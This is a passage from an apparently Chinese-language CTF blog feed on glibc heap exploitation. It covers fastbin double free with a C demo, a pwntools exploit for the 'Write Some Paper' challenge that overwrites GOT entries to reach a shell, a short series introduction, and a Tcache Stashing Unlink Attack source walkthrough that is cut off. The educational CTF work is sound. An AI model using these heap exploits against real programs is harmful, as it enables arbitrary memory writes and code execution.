class="line"><span class="number">0x555555757250</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000021</span> #index1(tcachebin)</span><br><span class="line"><span class="number">0x555555757260</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000555555757010</span></span><br><span class="line"><span class="number">0x555555757270</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000021</span> #index2(tcachebin)</span><br><span class="line"><span class="number">0x555555757280</span>:<span class="number">0x0000555555757260</span><span class="number">0x0000555555757010</span></span><br><span class="line"><span class="number">0x555555757290</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000021</span> #index3(tcachebin)</span><br><span class="line"><span class="number">0x5555557572a0</span>:<span class="number">0x0000555555757280</span><span class="number">0x0000555555757010</span></span><br><span class="line"><span class="number">0x5555557572b0</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000021</span> #index4(tcachebin)</span><br><span class="line"><span class="number">0x5555557572c0</span>:<span class="number">0x00005555557572a0</span><span class="number">0x0000555555757010</span></span><br><span class="line"><span class="number">0x5555557572d0</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000021</span> #index5(tcachebin)</span><br><span class="line"><span class="number">0x5555557572e0</span>:<span class="number">0x00005555557572c0</span><span class="number">0x0000555555757010</span></span><br><span class="line"><span class="number">0x5555557572f0</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000021</span> #index6(tcachebin)</span><br><span class="line"><span class="number">0x555555757300</span>:<span class="number">0x00005555557572e0</span><span class="number">0x0000555555757010</span></span><br><span class="line"><span class="number">0x555555757310</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000021</span> #index7(tcachebin)</span><br><span class="line"><span class="number">0x555555757320</span>:<span class="number">0x0000555555757300</span><span class="number">0x0000555555757010</span></span><br><span class="line"><span class="number">0x555555757330</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000021</span> #index8(<span class="built_in">malloc</span>)</span><br><span class="line"><span class="number">0x555555757340</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x555555757350</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000021</span> #index9(fastbin)</span><br><span class="line"><span class="number">0x555555757360</span>:<span class="number">0x0000555555757370</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x555555757370</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000021</span> #index10(fastbin)</span><br><span class="line"><span class="number">0x555555757380</span>:<span class="number">0x0000555555757350</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x555555757390</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000021</span> #index11(<span class="built_in">malloc</span>)</span><br><span class="line"><span class="number">0x5555557573a0</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x5555557573b0</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000020c51</span> #top_chunk</span><br><span class="line">pwndbg&gt;</span><br></pre></td></tr></table></figure><p>现在 fastbin 中的 0x20 链表中形成了 double free，我们重新申请堆块：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Now the free list has [ %p, %p, %p ]. If we malloc 3 times, we&#x27;ll get %p twice!\n&quot;</span>, a, b, a, a);</span><br><span class="line">a = <span class="built_in">calloc</span>(<span class="number">1</span>, <span class="number">8</span>); <span class="comment">//重新向fastbin申请三个堆块</span></span><br><span class="line">b = <span class="built_in">calloc</span>(<span class="number">1</span>, <span class="number">8</span>);</span><br><span class="line">c = <span class="built_in">calloc</span>(<span class="number">1</span>, <span class="number">8</span>);</span><br><span class="line">assert(a == c);</span><br></pre></td></tr></table></figure><p>申请 fastbin 的具体过程就不说了，感兴趣可以参考之前的 malloc 文章，a 和 c 指向的地址一定是相同的：<br><img src="https://cdn.nlark.com/yuque/0/2021/png/574026/1618901126491-69532906-d1c0-42d0-8b16-a853620785c4.png#clientId=ub72fb564-79e2-4&from=drop&id=ub4d85211&margin=%5Bobject%20Object%5D&name=%E6%88%AA%E5%B1%8F2021-04-20%2014.45.22.png&originHeight=276&originWidth=2750&originalType=binary&size=47450&status=done&style=none&taskId=u31a763f5-2872-46fc-9bb2-9610359cd6d" alt="截屏2021-04-20 14.45.22.png"></p><h1 id="利用方式"><a href="#利用方式" class="headerlink" title="利用方式"></a>利用方式</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">chunk</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">long</span> <span class="keyword">long</span> pre_size;</span><br><span class="line">    <span class="keyword">long</span> <span class="keyword">long</span> size;</span><br><span class="line">    <span class="keyword">long</span> <span class="keyword">long</span> fd;</span><br><span class="line">    <span class="keyword">long</span> <span class="keyword">long</span> bk;</span><br><span class="line">&#125; CHUNK,*PCHUNK;</span><br><span class="line"></span><br><span class="line">CHUNK bss_chunk;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    setbuf(<span class="built_in">stdout</span>,<span class="literal">NULL</span>); <span class="comment">//关闭输出缓冲区</span></span><br><span class="line">    setbuf(<span class="built_in">stdin</span>,<span class="literal">NULL</span>);  <span class="comment">//关闭输入缓冲区</span></span><br><span class="line">    <span class="keyword">void</span> *q[<span class="number">8</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="keyword">void</span> *chunk1,*chunk2,*chunk3;</span><br><span class="line">    <span class="keyword">void</span> *chunk_a,*chunk_b;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span> ; i &lt; <span class="number">8</span> ;i++)&#123;</span><br><span class="line">q[i]=<span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span> ; i &lt; <span class="number">7</span> ;i++)&#123;</span><br><span class="line"><span class="built_in">free</span>(q[i]);  <span class="comment">//填充tcachebin</span></span><br><span class="line">    &#125;</span><br><span class="line">    bss_chunk.size=<span class="number">0x21</span>;</span><br><span class="line">    chunk1=<span class="built_in">calloc</span>(<span class="number">1</span>,<span class="number">0x10</span>); <span class="comment">//申请堆块</span></span><br><span class="line">    chunk2=<span class="built_in">calloc</span>(<span class="number">1</span>,<span class="number">0x10</span>); <span class="comment">//申请堆块</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">free</span>(chunk1); <span class="comment">//double free</span></span><br><span class="line">    <span class="built_in">free</span>(chunk2);</span><br><span class="line">    <span class="built_in">free</span>(chunk1);</span><br><span class="line"><span class="comment">//chunk1-&gt;chunk2-&gt;chunk1</span></span><br><span class="line">    chunk_a=<span class="built_in">calloc</span>(<span class="number">1</span>,<span class="number">0x10</span>); <span class="comment">//申请chunk1后，现在chunk1可写：chunk2-&gt;chunk1-&gt;bss_chunk</span></span><br><span class="line">    *(<span class="keyword">long</span> <span class="keyword">long</span> *)chunk_a=&amp;bss_chunk; <span class="comment">//更改chunk1的fd指针</span></span><br><span class="line">    <span class="built_in">calloc</span>(<span class="number">1</span>,<span class="number">0x10</span>); <span class="comment">//申请chunk2</span></span><br><span class="line">    <span class="built_in">calloc</span>(<span class="number">1</span>,<span class="number">0x10</span>); <span class="comment">//申请chunk1</span></span><br><span class="line">    chunk_b=<span class="built_in">calloc</span>(<span class="number">1</span>,<span class="number">0x10</span>); <span class="comment">//申请bss_chunk</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%p\n&quot;</span>,chunk_b); <span class="comment">//达到控制任意内存地址</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2021/png/574026/1618904686761-356d7c1a-5998-4d85-8068-8a57a32cd871.png#clientId=ub72fb564-79e2-4&from=drop&id=llvkZ&margin=%5Bobject%20Object%5D&name=%E6%88%AA%E5%B1%8F2021-04-20%2015.44.43.png&originHeight=130&originWidth=2750&originalType=binary&size=32611&status=done&style=none&taskId=u30896d72-baf8-4323-a11f-c4775927678" alt="截屏2021-04-20 15.44.43.png"><br>再经过第 34 行代码之后，chunk1 处于“薛定谔状态”，我们将 chunk1 称之为“薛定谔堆块”，也就是说 chunk1 即存在 malloc 状态又存在 free 状态（不好意思，这个概念我编的），一个小总结如下：<br>不要只考虑使用 fastbin dup，如果某个堆块 free 一次后其 fd 指针仍可篡改，直接篡改为 target 然后 malloc 两次就行了，总之要灵活 pwn，一个例子如下：<br>iscc 2018 Write Some Paper：glibc 2.23</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    Arch:     amd64-64-little</span></span><br><span class="line"><span class="string">    RELRO:    Partial RELRO #我们可以覆写got.plt表（即got表）</span></span><br><span class="line"><span class="string">    Stack:    Canary found</span></span><br><span class="line"><span class="string">    NX:       NX enabled</span></span><br><span class="line"><span class="string">    PIE:      No PIE (0x400000)</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="comment">#open partial relro ,so wo can overwrite got.plt</span></span><br><span class="line">p=process(<span class="string">&#x27;./paper&#x27;</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./paper&#x27;</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">choose</span>(<span class="params">choice</span>):</span></span><br><span class="line">    p.sendline(<span class="built_in">str</span>(choice))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add_paper</span>(<span class="params">index,size,content</span>):</span></span><br><span class="line">    choose(<span class="number">1</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Input the index you want to store(0-9):&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;How long you will enter:&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;please enter your content:&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(content))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete_paper</span>(<span class="params">index</span>):</span></span><br><span class="line">    choose(<span class="number">2</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;which paper you want to delete,please enter it&#x27;s index(0-9):&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line">add_paper(<span class="number">0</span>,<span class="number">0x30</span>,<span class="string">&#x27;aaaa&#x27;</span>)</span><br><span class="line">add_paper(<span class="number">1</span>,<span class="number">0x30</span>,<span class="string">&#x27;bbbb&#x27;</span>)</span><br><span class="line"></span><br><span class="line">delete_paper(<span class="number">0</span>) <span class="comment">#double free</span></span><br><span class="line">delete_paper(<span class="number">1</span>)</span><br><span class="line">delete_paper(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">system_addr=elf.symbols[<span class="string">&#x27;gg&#x27;</span>] <span class="comment">#get system(gg function) addr</span></span><br><span class="line">puts_got_addr=elf.got[<span class="string">&#x27;puts&#x27;</span>] <span class="comment">#get puts.got.plt addr</span></span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(elf.plt[<span class="string">&#x27;puts&#x27;</span>]) <span class="comment">#0x400720</span></span><br><span class="line">log.success(<span class="string">&quot;get system_addr : &quot;</span>+<span class="built_in">hex</span>(system_addr))</span><br><span class="line">log.success(<span class="string">&quot;puts_got_addr : &quot;</span>+<span class="built_in">hex</span>(puts_got_addr)) <span class="comment">#puts@got.plt==0x602020</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">pwndbg&gt; x/16gx 0x400720</span></span><br><span class="line"><span class="string">0x400720 &lt;puts@plt&gt;:0x0168002018fa25ff0xffffffd0e9000000</span></span><br><span class="line"><span class="string">0x400730 &lt;fread@plt&gt;:0x0268002018f225ff0xffffffc0e9000000</span></span><br><span class="line"><span class="string">0x400740 &lt;__stack_chk_fail@plt&gt;:0x0368002018ea25ff0xffffffb0e9000000</span></span><br><span class="line"><span class="string">0x400750 &lt;system@plt&gt;:0x0468002018e225ff0xffffffa0e9000000</span></span><br><span class="line"><span class="string">0x400760 &lt;printf@plt&gt;:0x0568002018da25ff0xffffff90e9000000</span></span><br><span class="line"><span class="string">0x400770 &lt;__libc_start_main@plt&gt;:0x0668002018d225ff0xffffff80e9000000</span></span><br><span class="line"><span class="string">0x400780 &lt;__gmon_start__@plt&gt;:0x0768002018ca25ff0xffffff70e9000000</span></span><br><span class="line"><span class="string">0x400790 &lt;strtol@plt&gt;:0x0868002018c225ff0xffffff60e9000000</span></span><br><span class="line"><span class="string">pwndbg&gt; x/16gx 0x602020</span></span><br><span class="line"><span class="string">0x602020 &lt;puts@got.plt&gt;:0x00007ffff7a7c6a00x00007ffff7a7b1b0</span></span><br><span class="line"><span class="string">0x602030 &lt;__stack_chk_fail@got.plt&gt;:0x00000000004007460x0000000000400756</span></span><br><span class="line"><span class="string">0x602040 &lt;printf@got.plt&gt;:0x00007ffff7a628100x00007ffff7a2d750</span></span><br><span class="line"><span class="string">0x602050 &lt;__gmon_start__@got.plt&gt;:0x00000000004007860x00007ffff7a483d0</span></span><br><span class="line"><span class="string">0x602060 &lt;malloc@got.plt&gt;:0x00007ffff7a911800x00007ffff7a7ce80</span></span><br><span class="line"><span class="string">0x602070 &lt;__isoc99_scanf@got.plt&gt;:0x00007ffff7a784e00x00000000004007d6</span></span><br><span class="line"><span class="string">0x602080:0x00000000000000000x0000000000000000</span></span><br><span class="line"><span class="string">0x602090:0x00000000000000000x0000000000000000</span></span><br><span class="line"><span class="string">pwndbg&gt;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">victim_addr=puts_got_addr+<span class="number">0xa</span></span><br><span class="line">add_paper(<span class="number">2</span>,<span class="number">0x30</span>,p64(victim_addr))</span><br><span class="line">add_paper(<span class="number">3</span>,<span class="number">0x30</span>,<span class="string">&#x27;cccc&#x27;</span>)</span><br><span class="line">add_paper(<span class="number">4</span>,<span class="number">0x30</span>,<span class="string">&#x27;dddd&#x27;</span>)</span><br><span class="line">gdb.attach(p)</span><br><span class="line">add_paper(<span class="number">5</span>,<span class="number">0x30</span>,<span class="string">&quot;\x40\x00\x00\x00\x00\x00&quot;</span>+p64(system_addr)) <span class="comment">#overwrite printf@got.plt</span></span><br><span class="line">  <span class="comment">#复写got表并防止system@got.plt被破坏</span></span><br><span class="line">p.sendline(<span class="string">&#x27;Cyberangel&#x27;</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;/assets/css/APlayer.min.css&quot;&gt;&lt;script src=&quot;/assets/js/APlayer.min.js&quot; cla</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>阅前必看</title>
    <link href="https://cyberangel.cn/2021/04/05/%E9%98%85%E5%89%8D%E5%BF%85%E7%9C%8B/"/>
    <id>https://cyberangel.cn/2021/04/05/%E9%98%85%E5%89%8D%E5%BF%85%E7%9C%8B/</id>
    <published>2021-04-05T09:31:48.000Z</published>
    <updated>2021-07-04T09:57:12.335Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>入坑 pwn 大概也有大半年时间了，最近发现自己对堆底层的知识不够牢固：只知其一不知其二。尤其是对 unlink 过程和 unsortedbin 等数据结构为双向循环链表的 bins 掌握模棱两可，因此打算对 malloc 源码进行下手，重点分析_int_malloc 函数，然后在已有的参考资料帮助下构建出“glibc malloc 知识体系”。参考资料会在最后一篇文章中列出，大师傅们看个笑话就行了（逃~</p><p>文章主要以调试为主，目标是读透 malloc 源码（程序例子都是本菜鸡写的），每篇文章都具有针对性并且大部分文章还有我画的图（以 PPT 形式呈现，可免费下载）；由于本人精力有限，很难保证每篇文章都没有错误，如有错误或用词不当可以在文章下面指出，这里先谢谢师傅们。</p><p>文章将从今天开始陆续发出。。。。。。</p><p>这里是第一篇（后续文章顺序可能有所调整）：<br><a href="https://www.yuque.com/cyberangel/rg9gdm/hagsy9">https://www.yuque.com/cyberangel/rg9gdm/hagsy9</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;/assets/css/APlayer.min.css&quot;&gt;&lt;script src=&quot;/assets/js/APlayer.min.js&quot; cla</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>PWN进阶（1-7-3）-smallbin_attack-Tcache Stashing Unlink Attack（calloc）</title>
    <link href="https://cyberangel.cn/2021/02/25/PWN%E8%BF%9B%E9%98%B6%EF%BC%881-7-3%EF%BC%89-smallbin_attack-Tcache%20Stashing%20Unlink%20Attack%EF%BC%88calloc%EF%BC%89/"/>
    <id>https://cyberangel.cn/2021/02/25/PWN%E8%BF%9B%E9%98%B6%EF%BC%881-7-3%EF%BC%89-smallbin_attack-Tcache%20Stashing%20Unlink%20Attack%EF%BC%88calloc%EF%BC%89/</id>
    <published>2021-02-25T07:01:48.000Z</published>
    <updated>2021-07-04T09:57:12.936Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><blockquote><p>参考资料：<br><a href="https://www.anquanke.com/post/id/198173">https://www.anquanke.com/post/id/198173</a> &gt; <a href="https://xz.aliyun.com/t/7192">https://xz.aliyun.com/t/7192</a> &gt; <a href="https://ctf-wiki.org/pwn/linux/glibc-heap/tcache_attack/#tcache-stashing-unlink-attack">https://ctf-wiki.org/pwn/linux/glibc-heap/tcache_attack/#tcache-stashing-unlink-attack</a><br>附件：<br>链接: <a href="https://pan.baidu.com/s/1qwkkkP0GeQaPupD6EZxq2w">https://pan.baidu.com/s/1qwkkkP0GeQaPupD6EZxq2w</a>   密码: g04j<br>–来自百度网盘超级会员 V3 的分享</p></blockquote><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>在上一小节中，我们对 house of lore 的讲解并没有牵扯到 tcache，这一小节的对 smallbin_attack 就牵扯到了 tcache，这种攻击方式被命名为 Tcache Stashing Unlink Attack。<br>在 glibc 2.29 增加了对 unsorted bin attack 的检查，即检查双向链表的完整性，这使得这个攻击完全失去了作用，但是我们可以使用 Tcache Stashing Unlink Attack 攻击方式。</p><blockquote><p>源码下载地址：<a href="http://ftp.gnu.org/gnu/glibc/">http://ftp.gnu.org/gnu/glibc/</a><br>这里下载的是 glibc-2.29.tar.gz，也可以到附件中下载<br>以下源码均为 glibc 2.29</p></blockquote><h1 id="攻击目的"><a href="#攻击目的" class="headerlink" title="攻击目的"></a>攻击目的</h1><p>首先来说一下这种攻击方式的目的：</p><ul><li>向任意指定位置写入指定值（这个指定值为 main_arena）</li><li>向任意的地址中分配一个 chunk</li></ul><h1 id="攻击核心"><a href="#攻击核心" class="headerlink" title="攻击核心"></a>攻击核心</h1><p>在将 smallbin 的堆块合并到 tcachebin 时利用伪造的 smallbin bk 指针来分配任意内存地址</p><h1 id="源代码分析"><a href="#源代码分析" class="headerlink" title="源代码分析"></a>源代码分析</h1><p>首先来看一下漏洞源代码之前的一些对 smallbin 的操作：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#malloc.c 第3639-3663行</span></span><br><span class="line">   <span class="comment">/*</span></span><br><span class="line"><span class="comment">     If a small request, check regular bin.  Since these &quot;smallbins&quot;</span></span><br><span class="line"><span class="comment">     hold one size each, no searching within bins is necessary.</span></span><br><span class="line"><span class="comment">     (For a large request, we need to wait until unsorted chunks are</span></span><br><span class="line"><span class="comment">     processed to find best fit. But for small ones, fits are exact</span></span><br><span class="line"><span class="comment">     anyway, so we can check now, which is faster.)</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (in_smallbin_range (nb)) <span class="comment">//nb为所申请的chunk的真实大小。</span></span><br><span class="line">    &#123; <span class="comment">//若申请的chunk大小在smallbin中</span></span><br><span class="line">      idx = smallbin_index (nb); <span class="comment">//获取smallbin的索引</span></span><br><span class="line">      bin = bin_at (av, idx); <span class="comment">//获取smallbin中的chunk指针</span></span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> ((victim = last (bin)) != bin)</span><br><span class="line">        &#123;<span class="comment">// 先执行 victim= last(bin)，获取 small bin 的最后一个 chunk</span></span><br><span class="line">         <span class="comment">// 如果 victim = bin ，那说明该 bin 为空。</span></span><br><span class="line">          bck = victim-&gt;bk;</span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (bck-&gt;fd != victim)) <span class="comment">// 检查 bck-&gt;fd 是不是 victim，防止伪造</span></span><br><span class="line">    malloc_printerr (<span class="string">&quot;malloc(): smallbin double linked list corrupted&quot;</span>);</span><br><span class="line">              set_inuse_bit_at_offset (victim, nb); <span class="comment">// 设置 victim 对应的 inuse 位</span></span><br><span class="line">              bin-&gt;bk = bck; <span class="comment">//修改 smallbin 链表，将 small bin 的最后一个 chunk 取出来</span></span><br><span class="line">              bck-&gt;fd = bin;</span><br><span class="line"></span><br><span class="line">          <span class="keyword">if</span> (av != &amp;main_arena)/ 如果不是 main_arena，设置对应的标志</span><br><span class="line">    set_non_main_arena (victim);</span><br><span class="line">          check_malloced_chunk (av, victim, nb);<span class="comment">// 细致的检查</span></span><br></pre></td></tr></table></figure><p>和之前所说的 house of lore 的源代码大同小异，首先我们要请求一个大小为 nb 的 chunk，若此时堆中有两个空闲的 smallbin chunk，根据 small bin 的 FIFO，会对最早释放的 small bin 进行 unlink 操作，在 unlink 之前会有链表的完整性检查__glibc_unlikely (bck-&gt;fd != victim)；<br>在将这个堆块给用户之后，如果对应的 tcache bins 的数量小于最大数量，则剩余的 small bin 将会被放入 tcache 中，源代码如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#malloc.c 第3664行-3688行</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> USE_TCACHE</span></span><br><span class="line">  <span class="comment">/* While we&#x27;re here, if we see other chunks of the same size,</span></span><br><span class="line"><span class="comment">     stash them in the tcache.  */</span></span><br><span class="line">  <span class="keyword">size_t</span> tc_idx = csize2tidx (nb); <span class="comment">//遍历整个smallbin，获取相同size 的free chunk</span></span><br><span class="line">  <span class="keyword">if</span> (tcache &amp;&amp; tc_idx &lt; mp_.tcache_bins)</span><br><span class="line">    &#123;</span><br><span class="line">      mchunkptr tc_victim;</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* While bin not empty and tcache not full, copy chunks over.  */</span></span><br><span class="line">      <span class="keyword">while</span> (tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count <span class="comment">//判断对应size tcache链表是否已满</span></span><br><span class="line">                 <span class="comment">//取出smallbin的末尾chunk</span></span><br><span class="line">     &amp;&amp; (tc_victim = last (bin)) != bin) <span class="comment">//判断取出的chunk是否为bin本身（smallbin是否已空）</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (tc_victim != <span class="number">0</span>)</span><br><span class="line">    &#123;<span class="comment">//如果成功的获取了chunk</span></span><br><span class="line">      bck = tc_victim-&gt;bk;<span class="comment">//获取smallbin中的倒数第二个chunk</span></span><br><span class="line">      set_inuse_bit_at_offset (tc_victim, nb); <span class="comment">//设置inuse标志位</span></span><br><span class="line">      <span class="keyword">if</span> (av != &amp;main_arena) <span class="comment">//如果不是main_arena</span></span><br><span class="line">set_non_main_arena (tc_victim); <span class="comment">//设置相应的标志位</span></span><br><span class="line">      bin-&gt;bk = bck;<span class="comment">//取出smallbin中的最后一个chunk</span></span><br><span class="line">      bck-&gt;fd = bin;</span><br><span class="line"></span><br><span class="line">      tcache_put (tc_victim, tc_idx); <span class="comment">//将其放入到tcache中</span></span><br><span class="line">            &#125;</span><br><span class="line">&#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>在这里回忆一下上一小节 house of lore 在取出 chunk 时对同时对倒数第二个 chunk 进行了检查，源码如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#house of lore中的检查</span></span><br><span class="line"><span class="keyword">if</span> (__glibc_unlikely (bck-&gt;fd != victim)) <span class="comment">// 检查 bck-&gt;fd 是不是 victim，防止伪造</span></span><br><span class="line">                &#123;</span><br><span class="line">                  errstr = <span class="string">&quot;malloc(): smallbin double linked list corrupted&quot;</span>;</span><br><span class="line">                  <span class="keyword">goto</span> errout;</span><br><span class="line">                &#125;</span><br><span class="line"><span 